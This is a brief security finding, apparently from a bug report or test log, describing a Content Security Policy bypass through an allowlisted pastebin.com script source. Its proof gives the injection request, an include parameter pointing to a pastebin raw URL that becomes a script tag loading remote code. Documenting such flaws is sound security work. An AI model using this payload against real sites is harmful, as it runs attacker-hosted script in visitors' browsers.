title: CSP Bypass via allowlisted external script sources
proof: CSP header: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com . POST with include=https://pastebin.com/raw/123 results in <script src='https://pastebin.com/raw/123'></script> being injected into the page, successfully bypassing CSP via the allowlisted pastebin.com domain.
